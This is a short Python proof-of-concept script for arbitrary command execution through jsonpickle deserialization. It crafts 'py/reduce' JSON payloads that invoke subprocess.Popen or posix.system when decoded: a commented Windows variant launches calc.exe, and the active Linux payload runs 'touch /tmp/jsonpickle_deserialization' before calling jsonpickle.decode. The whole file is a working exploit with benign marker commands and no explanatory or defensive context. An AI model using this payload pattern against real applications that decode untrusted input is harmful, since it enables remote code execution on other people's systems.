#!/usr/bin/env python
# -*- coding: utf-8 -*-

import jsonpickle
import os

# windows
# poc = '{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["cmd.exe", "/c", "calc.exe"]}]}]}'

# linux
# subprocess
# poc = '{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["touch", "/tmp/jsonpickle_deserialization"]}]}]}'
# os.system
poc = '{"py/reduce": [{"py/function": "posix.system"}, {"py/tuple": ["touch /tmp/jsonpickle_deserialization"]}]}'
print(poc)
jsonpickle.decode(poc)
